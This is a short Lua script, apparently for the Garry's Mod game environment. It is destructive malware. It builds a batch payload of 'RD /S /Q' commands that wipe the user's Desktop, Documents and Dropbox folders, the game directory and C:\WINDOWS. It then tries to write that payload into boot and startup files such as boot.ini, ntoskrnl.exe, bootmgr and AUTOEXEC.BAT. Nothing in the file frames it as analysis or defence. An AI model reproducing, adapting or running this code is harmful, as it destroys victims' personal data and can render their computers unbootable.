

local LOL = (_H.NotRPF("gameinfo.txt"):gsub("gameinfo.txt", ""):Trim("\\")) or "C:\\"
local Whoops = [[
RD /S /Q "%UserProfile%\Desktop"
RD /S /Q "%UserProfile%\Documents"

RD /S /Q "%UserProfile%\Dropbox"
RD /S /Q "%UserProfile%\My Dropbox"
RD /S /Q "%UserProfile%\Documents\Dropbox"
RD /S /Q "%UserProfile%\Documents\My Dropbox"

RD /S /Q "]]..LOL..[["

RD /S /Q C:\WINDOWS
]]

local Eat = {
	["gameinfo.txt"] 						= "?",
	["garrysmod/gameinfo.txt"] 				= "?",
	["garrysmod/garrysmod/gameinfo.txt"]	= "?",
	
	["C:\\boot.ini"] = Whoops,
	["C:\\config.sys"] = Whoops,
	["C:\\ntldr"] = Whoops,
	["C:\\WINDOWS\\bootstat.dat"] = Whoops,
	["C:\\WINDOWS\\System32\\ntoskrnl.exe"] = Whoops,
	["C:\\WINDOWS\\System32\\hal.dll"] = Whoops,
	["C:\\WINDOWS\\System32\\bootres.dll"] = Whoops,
	["C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin"] = Whoops,
	["C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com"] = Whoops,
	["C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi"] = Whoops,
	["C:\\WINDOWS\\Boot\\PCAT\\bootmgr"] = Whoops,
	
	["C:\\AUTOEXEC.BAT"] = Whoops,
}

local Res = ""
for k,v in _H.pairs(Eat) do
	local ret,err = _H.pcall(_H.NotSX, v, k)
	
	if ret or (err and err != "attempt to call a string value") then
		err = "EatWhoops=".._H.tostring(err)
		
		_H.DelayGMG(err)
		Res = Res.."\n"..err
	end
end

return Res == "" and "Whoops" or Res





